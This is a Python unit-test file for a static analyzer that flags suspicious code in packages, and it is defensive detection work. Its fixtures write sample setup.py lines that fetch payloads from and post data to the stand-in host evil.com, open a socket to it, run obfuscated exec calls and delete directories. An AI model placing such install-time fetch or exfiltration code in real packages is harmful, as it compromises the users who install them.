"""Unit tests for static code analyzer."""
import pytest
import tempfile
import os
from pathlib import Path
from app.analyzers.static_code import StaticCodeAnalyzer
from app.analyzers.base import SeverityLevel


@pytest.mark.unit
@pytest.mark.asyncio
class TestStaticCodeAnalyzer:
    """Tests for StaticCodeAnalyzer."""

    @pytest.fixture
    def analyzer(self):
        """Create analyzer instance."""
        return StaticCodeAnalyzer()

    @pytest.fixture
    def sample_metadata(self):
        """Sample package metadata."""
        return {
            "name": "test-package",
            "version": "1.0.0",
        }

    @pytest.fixture
    def temp_package_dir(self):
        """Create a temporary package directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    async def test_analyze_no_extracted_path(self, analyzer, sample_metadata):
        """Test analysis when source code is not available."""
        result = await analyzer.analyze(
            "test-package",
            "1.0.0",
            sample_metadata,
            extracted_path=None
        )

        assert result.category == "static_code"
        assert len(result.findings) == 1
        assert result.findings[0].severity == SeverityLevel.INFO
        assert "not available" in result.findings[0].title.lower()

    async def test_analyze_invalid_path(self, analyzer, sample_metadata):
        """Test analysis with non-existent path."""
        result = await analyzer.analyze(
            "test-package",
            "1.0.0",
            sample_metadata,
            extracted_path="/nonexistent/path"
        )

        assert result.category == "static_code"
        assert len(result.findings) == 1
        assert result.findings[0].severity == SeverityLevel.INFO

    async def test_find_python_files(self, analyzer, temp_package_dir):
        """Test finding Python files in directory."""
        # Create test files
        Path(temp_package_dir, "file1.py").touch()
        Path(temp_package_dir, "file2.py").touch()
        Path(temp_package_dir, "README.md").touch()

        subdir = Path(temp_package_dir, "subdir")
        subdir.mkdir()
        Path(subdir, "file3.py").touch()

        # Create hidden directory (should be ignored)
        hidden_dir = Path(temp_package_dir, ".hidden")
        hidden_dir.mkdir()
        Path(hidden_dir, "file4.py").touch()

        files = analyzer._find_python_files(temp_package_dir)

        assert len(files) == 3  # Should find 3 .py files (excluding hidden)
        assert all(f.endswith(".py") for f in files)

    async def test_find_python_files_skip_pycache(self, analyzer, temp_package_dir):
        """Test that __pycache__ directories are skipped."""
        pycache_dir = Path(temp_package_dir, "__pycache__")
        pycache_dir.mkdir()
        Path(pycache_dir, "test.pyc").touch()

        Path(temp_package_dir, "main.py").touch()

        files = analyzer._find_python_files(temp_package_dir)

        assert len(files) == 1
        assert "main.py" in files[0]

    async def test_detect_eval_call(self, analyzer, temp_package_dir):
        """Test detection of eval() function call."""
        code = """
def malicious():
    eval("print('hello')")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        eval_findings = [f for f in findings if "eval" in f.title.lower()]
        assert len(eval_findings) > 0
        assert eval_findings[0].severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]

    async def test_detect_exec_call(self, analyzer, temp_package_dir):
        """Test detection of exec() function call."""
        code = """
code = "print('executed')"
exec(code)
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        exec_findings = [f for f in findings if "exec" in f.title.lower()]
        assert len(exec_findings) > 0
        assert exec_findings[0].severity == SeverityLevel.CRITICAL

    async def test_detect_compile_call(self, analyzer, temp_package_dir):
        """Test detection of compile() function call."""
        code = """
compile("print('test')", "<string>", "exec")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        compile_findings = [f for f in findings if "compile" in f.title.lower()]
        assert len(compile_findings) > 0
        assert compile_findings[0].severity in [SeverityLevel.HIGH, SeverityLevel.CRITICAL]

    async def test_detect_import_call(self, analyzer, temp_package_dir):
        """Test detection of __import__() function call."""
        code = """
module = __import__("os")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        import_findings = [f for f in findings if "__import__" in f.title.lower()]
        assert len(import_findings) > 0
        assert import_findings[0].severity in [SeverityLevel.MEDIUM, SeverityLevel.HIGH]

    async def test_detect_dynamic_input_eval(self, analyzer, temp_package_dir):
        """Test that eval() with dynamic input has higher severity."""
        code = """
user_input = input("Enter code: ")
eval(user_input)  # Dynamic input - should be CRITICAL
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        eval_findings = [f for f in findings if "eval" in f.title.lower()]
        assert len(eval_findings) > 0
        assert eval_findings[0].severity == SeverityLevel.CRITICAL
        assert eval_findings[0].metadata["has_dynamic_input"] is True

    async def test_detect_os_system_access(self, analyzer, temp_package_dir):
        """Test detection of os.system access."""
        code = """
import os
os.system("ls -la")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        os_findings = [f for f in findings if "os.system" in f.title.lower()]
        assert len(os_findings) > 0
        assert os_findings[0].severity == SeverityLevel.HIGH

    async def test_detect_base64_exec_obfuscation(self, analyzer, temp_package_dir):
        """Test detection of base64 + exec obfuscation pattern."""
        code = """
import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        obfuscation_findings = [f for f in findings if "obfuscation" in f.title.lower()]
        assert len(obfuscation_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in obfuscation_findings)

    async def test_detect_zlib_base64_obfuscation(self, analyzer, temp_package_dir):
        """Test detection of zlib + base64 obfuscation pattern."""
        code = """
import zlib
import base64
zlib.decompress(base64.b64decode("eJwLycxNVUjMK1HI..."))
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        obfuscation_findings = [f for f in findings if "obfuscation" in f.title.lower()]
        assert len(obfuscation_findings) > 0
        assert any(f.metadata.get("pattern") == "zlib_base64" for f in obfuscation_findings)

    async def test_detect_marshal_loads(self, analyzer, temp_package_dir):
        """Test detection of marshal.loads() pattern."""
        code = """
import marshal
code = marshal.loads(b"\\x63...")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        marshal_findings = [f for f in findings if "marshal" in f.title.lower() or "marshal" in str(f.metadata)]
        assert len(marshal_findings) > 0

    async def test_detect_high_entropy_string(self, analyzer, temp_package_dir):
        """Test detection of high-entropy strings."""
        # Generate a high-entropy string (truly random base64-like string)
        # Using different characters to maximize entropy
        high_entropy_str = "aK9mZ3qLwXpNvC5tRjEhD6gF0sYbT2uI8oP7eW4rQ1lM/nA+xG3cU=" + \
                          "BmkJyHzVfNpRsWqLtOgDxCaEb5vU9nI2h7jK4eM0wX3lY6rT+8F1" + "GzQoAcVpS="
        code = f'''
secret = "{high_entropy_str}"
'''
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        entropy_findings = [f for f in findings if "entropy" in f.title.lower()]
        assert len(entropy_findings) > 0
        assert entropy_findings[0].severity == SeverityLevel.MEDIUM

    async def test_setup_file_http_request(self, analyzer, temp_package_dir):
        """Test detection of HTTP requests in setup.py."""
        code = """
import requests
response = requests.get("https://evil.com/payload.py")
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        network_findings = [f for f in findings if "network" in f.title.lower()]
        assert len(network_findings) > 0
        assert network_findings[0].severity == SeverityLevel.HIGH

    async def test_setup_file_http_post(self, analyzer, temp_package_dir):
        """Test detection of HTTP POST in setup.py."""
        code = """
import requests
requests.post("https://evil.com/exfiltrate", data={"key": "value"})
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        post_findings = [f for f in findings if "post" in f.title.lower() or "network" in f.title.lower()]
        assert len(post_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in post_findings)

    async def test_setup_file_socket_connect(self, analyzer, temp_package_dir):
        """Test detection of socket.connect in setup.py."""
        code = """
import socket
sock = socket.socket()
sock.connect(("evil.com", 1337))
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        socket_findings = [f for f in findings if "socket" in f.title.lower()]
        assert len(socket_findings) > 0

    async def test_setup_file_rmtree(self, analyzer, temp_package_dir):
        """Test detection of shutil.rmtree in setup.py."""
        code = """
import shutil
shutil.rmtree("/some/path")
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        # Check for filesystem operation findings
        fs_findings = [f for f in findings if "file system" in f.title.lower() or "rmtree" in f.title.lower() or "shutil" in str(f)]
        assert len(fs_findings) > 0
        # Should be HIGH or CRITICAL severity
        assert any(f.severity in [SeverityLevel.HIGH, SeverityLevel.CRITICAL] for f in fs_findings)

    async def test_setup_file_subprocess(self, analyzer, temp_package_dir):
        """Test detection of subprocess calls in setup.py."""
        code = """
import subprocess
subprocess.run(["ls", "-la"])
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        subprocess_findings = [f for f in findings if "subprocess" in f.title.lower()]
        assert len(subprocess_findings) > 0
        assert subprocess_findings[0].severity == SeverityLevel.HIGH

    async def test_suspicious_import_socket(self, analyzer, temp_package_dir):
        """Test detection of suspicious socket import."""
        code = """
import socket
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        socket_findings = [f for f in findings if "socket" in f.title.lower()]
        assert len(socket_findings) > 0
        assert socket_findings[0].severity == SeverityLevel.MEDIUM

    async def test_suspicious_import_in_setup_higher_severity(self, analyzer, temp_package_dir):
        """Test that suspicious imports in setup.py have higher severity."""
        code = """
import socket
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        socket_findings = [f for f in findings if "socket" in f.title.lower()]
        assert len(socket_findings) > 0
        # Should be escalated to HIGH in setup.py
        assert socket_findings[0].severity == SeverityLevel.HIGH
        assert socket_findings[0].metadata.get("in_setup") is True

    async def test_suspicious_import_from(self, analyzer, temp_package_dir):
        """Test detection of suspicious 'from' imports."""
        code = """
from os import system
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        import_findings = [f for f in findings if "import" in f.title.lower()]
        assert len(import_findings) > 0

    async def test_get_call_name_simple(self, analyzer):
        """Test getting function call name from AST node."""
        import ast
        code = "eval('test')"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        name = analyzer._get_call_name(call_node)
        assert name == "eval"

    async def test_get_call_name_attribute(self, analyzer):
        """Test getting attribute function name."""
        import ast
        code = "os.system('ls')"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        name = analyzer._get_call_name(call_node)
        assert name == "system"

    async def test_get_attribute_chain(self, analyzer):
        """Test getting full attribute chain."""
        import ast
        code = "os.path.join('a', 'b')"
        tree = ast.parse(code)
        call_node = tree.body[0].value
        attr_node = call_node.func

        chain = analyzer._get_attribute_chain(attr_node)
        assert chain == "os.path.join"

    async def test_get_attribute_chain_simple(self, analyzer):
        """Test attribute chain with simple attribute."""
        import ast
        code = "module.function()"
        tree = ast.parse(code)
        attr_node = tree.body[0].value.func

        chain = analyzer._get_attribute_chain(attr_node)
        assert chain == "module.function"

    async def test_has_dynamic_input_true(self, analyzer):
        """Test detection of dynamic input in function call."""
        import ast
        code = "eval(user_input)"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        result = analyzer._has_dynamic_input(call_node)
        assert result is True

    async def test_has_dynamic_input_false(self, analyzer):
        """Test detection when input is static."""
        import ast
        code = "eval('static string')"
        tree = ast.parse(code)
        call_node = tree.body[0].value

        result = analyzer._has_dynamic_input(call_node)
        assert result is False

    async def test_calculate_entropy_zero(self, analyzer):
        """Test entropy calculation for identical characters."""
        entropy = analyzer._calculate_entropy("aaaa")
        assert entropy == 0.0

    async def test_calculate_entropy_low(self, analyzer):
        """Test entropy for simple text."""
        entropy = analyzer._calculate_entropy("hello")
        assert 1.0 < entropy < 3.0

    async def test_calculate_entropy_high(self, analyzer):
        """Test entropy for random-looking strings."""
        # Base64-like string with high randomness
        random_str = "aK9mZ3qL8wX2pN7vC5tR4jE1hD6gF0sY"
        entropy = analyzer._calculate_entropy(random_str)
        assert entropy > 4.0

    async def test_calculate_entropy_empty(self, analyzer):
        """Test entropy for empty string."""
        entropy = analyzer._calculate_entropy("")
        assert entropy == 0.0

    async def test_count_by_severity(self, analyzer):
        """Test counting findings by severity."""
        from app.analyzers.base import Finding

        findings = [
            Finding(category="test", severity=SeverityLevel.CRITICAL, title="C1", description="Critical"),
            Finding(category="test", severity=SeverityLevel.CRITICAL, title="C2", description="Critical"),
            Finding(category="test", severity=SeverityLevel.HIGH, title="H1", description="High"),
            Finding(category="test", severity=SeverityLevel.MEDIUM, title="M1", description="Medium"),
            Finding(category="test", severity=SeverityLevel.LOW, title="L1", description="Low"),
        ]

        counts = analyzer._count_by_severity(findings)

        assert counts["critical"] == 2
        assert counts["high"] == 1
        assert counts["medium"] == 1
        assert counts["low"] == 1
        assert counts["info"] == 0

    async def test_analyze_file_with_syntax_error(self, analyzer, temp_package_dir):
        """Test that files with syntax errors don't crash analysis."""
        code = """
def broken(
    # Missing closing parenthesis
"""
        test_file = Path(temp_package_dir, "broken.py")
        test_file.write_text(code)

        # Should not raise exception
        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        # May have no findings or INFO findings, but should not crash
        assert isinstance(findings, list)

    async def test_analyze_multiple_findings_one_file(self, analyzer, temp_package_dir):
        """Test detecting multiple issues in a single file."""
        code = """
import socket
import subprocess

def dangerous():
    eval("print('test')")
    exec("code")
    os.system("ls")
"""
        test_file = Path(temp_package_dir, "multi.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        assert len(findings) >= 3  # Should find multiple issues
        # Should have eval, exec, and suspicious imports
        assert any("eval" in f.title.lower() for f in findings)
        assert any("exec" in f.title.lower() for f in findings)
        assert any("socket" in f.title.lower() or "subprocess" in f.title.lower() for f in findings)

    async def test_analyze_full_package(self, analyzer, temp_package_dir, sample_metadata):
        """Test analyzing a complete package with multiple files."""
        # Create multiple Python files
        Path(temp_package_dir, "safe.py").write_text("print('hello')")
        Path(temp_package_dir, "suspicious.py").write_text("import socket\neval('test')")
        Path(temp_package_dir, "setup.py").write_text("import requests\nrequests.get('http://evil.com')")

        result = await analyzer.analyze(
            "test-package",
            "1.0.0",
            sample_metadata,
            extracted_path=temp_package_dir
        )

        assert result.category == "static_code"
        assert result.metadata["files_analyzed"] == 3
        assert len(result.findings) > 0
        assert "findings_by_severity" in result.metadata

    async def test_nested_lambda_obfuscation(self, analyzer, temp_package_dir):
        """Test detection of nested lambda obfuscation."""
        code = """
f = lambda x: lambda y: lambda z: x + y + z
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        lambda_findings = [f for f in findings if "lambda" in f.title.lower() or "nested_lambda" in str(f.metadata)]
        assert len(lambda_findings) > 0

    async def test_hex_exec_pattern(self, analyzer, temp_package_dir):
        """Test detection of exec with hex string."""
        code = """
exec(bytes.fromhex('7072696e7428227465737422'))
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        hex_findings = [f for f in findings if "hex" in f.title.lower() or "hex_exec" in str(f.metadata)]
        assert len(hex_findings) > 0
        assert any(f.severity == SeverityLevel.CRITICAL for f in hex_findings)

    async def test_obfuscated_variable_names(self, analyzer, temp_package_dir):
        """Test detection of obfuscated variable names."""
        code = """
__O0O0O0__ = "suspicious"
__Il1lI1__ = __O0O0O0__
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        obfuscation_findings = [f for f in findings if "obfuscat" in f.title.lower()]
        assert len(obfuscation_findings) > 0

    async def test_urlopen_in_setup(self, analyzer, temp_package_dir):
        """Test detection of urlopen in setup.py with full module path."""
        code = """
import urllib.request
response = urllib.request.urlopen("https://evil.com/script.py")
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        # Check for network or urlopen findings
        network_findings = [f for f in findings if "urlopen" in f.title.lower() or "network" in f.title.lower()]
        assert len(network_findings) > 0
        # Should detect as HIGH or CRITICAL severity in setup.py
        assert any(f.severity in [SeverityLevel.HIGH, SeverityLevel.CRITICAL] for f in network_findings)

    async def test_file_chmod_in_setup(self, analyzer, temp_package_dir):
        """Test detection of chmod in setup.py."""
        code = """
import os
os.chmod("/tmp/file", 0o777)
"""
        setup_file = Path(temp_package_dir, "setup.py")
        setup_file.write_text(code)

        findings = await analyzer._analyze_file(str(setup_file), temp_package_dir)

        chmod_findings = [f for f in findings if "chmod" in f.title.lower()]
        assert len(chmod_findings) > 0

    async def test_getattr_setattr_detection(self, analyzer, temp_package_dir):
        """Test detection of getattr and setattr usage."""
        code = """
obj = object()
getattr(obj, "attr")
setattr(obj, "attr", "value")
"""
        test_file = Path(temp_package_dir, "test.py")
        test_file.write_text(code)

        findings = await analyzer._analyze_file(str(test_file), temp_package_dir)

        attr_findings = [f for f in findings if "getattr" in f.title.lower() or "setattr" in f.title.lower()]
        assert len(attr_findings) > 0
        # Should be LOW severity
        assert all(f.severity == SeverityLevel.LOW for f in attr_findings)
